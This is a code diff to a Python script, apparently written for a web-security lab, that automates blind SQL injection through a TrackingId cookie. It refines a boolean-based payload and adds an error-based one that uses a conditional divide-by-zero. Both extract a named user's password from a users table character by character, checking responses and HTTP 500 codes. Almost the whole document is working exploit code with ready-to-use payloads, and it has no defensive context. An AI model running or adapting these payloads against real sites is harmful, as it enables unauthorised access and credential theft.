@@ -29,8 +29,7 @@ def simple_sql_injection():
     text1 = url_response.text.splitlines()
 
     sql_injection = "sql injection"
-    replaced = sql_injection.replace(" ","%20")
-    injection = base_url+replaced
+    injection = base_url+sql_injection
     injection_request = session.get(injection)
     text2= injection_request.text.splitlines()
 
@@ -45,18 +44,16 @@ def show_text():
     print(url_response.text)
     print(url_response.cookies)
 
-
 def payload_inj(lang_pass, username):
     url_response = session.get(base_url)
-    cookies = url_response.cookies
 
-    tracking_id_cookies = cookies["TrackingId"]
-    session_id = cookies["session"]
+    tracking_id = url_response.cookies.get("TrackingId")
+    session_id = url_response.cookies.get("session")
     res = ""
 
     for i in range(1, lang_pass + 1):
         for j in CHAR_LIST:
-            payload = f"{tracking_id_cookies}' AND SUBSTRING((SELECT password FROM users WHERE username = '{username}'), {i}, 1) = '{j}'--"
+            payload = f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username = '{username}'), {i}, 1) = '{j}'--"
 
             cookies_injection = {
                 "TrackingId": payload,
@@ -73,6 +70,31 @@ def payload_inj(lang_pass, username):
             except requests.exceptions.RequestException as e:
                 print(e)
 
+        else:
+            print("Can't find a latter")
+            break
+
+def blind_error_inj(lang_pass, username):
+    url_response = session.get(base_url)
+
+    tracking_id = url_response.cookies.get("TrackingId")
+    session_id = url_response.cookies.get("session")
+    res = ""
+
+    for i in range(1, lang_pass + 1):
+        for j in CHAR_LIST:
+            payload = f"{tracking_id}' || (SELECT CASE WHEN SUBSTR(password, {i}, 1) = '{j}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='{username}')||'"
+            cookies_injection = {
+                "TrackingId": payload,
+                "session": session_id
+            }
+
+            response = session.get(base_url, cookies=cookies_injection)
+
+            if response.status_code == 500:
+                res += j
+                print(f"[+] Latter find {i}: {j} | Password: {res}")
+                break
         else:
             print("Can't find a latter")
             break
